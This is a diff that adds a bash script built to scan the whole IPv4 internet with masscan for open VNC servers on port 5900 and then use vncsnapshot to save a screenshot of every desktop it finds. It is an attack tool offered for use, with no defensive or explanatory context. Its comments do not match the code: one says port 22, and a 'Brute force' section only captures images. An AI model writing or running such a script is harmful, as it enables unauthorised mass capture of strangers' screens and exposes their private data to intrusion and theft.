@@ -1,0 +1,18 @@
+#!/bin/bash
+
+# Scan IPv4 range on port 22
+echo -e "\nStart scanning ...\n"
+masscan 0.0.0.0/0 -p5900 --exclude 255.255.255.255 | awk '{print $6}' > result.txt
+echo -e "\nEnding scanning !\n"
+
+# Brute force
+echo -e "\nStart capture ...\n"
+IFS=$'\n'
+for ip in $(cat result.txt)
+do
+
+	vncsnapshot -compresslevel 0 -quality 25 -vncQuality 2 $ip capture/$ip.jpg
+
+done
+
+exit 0
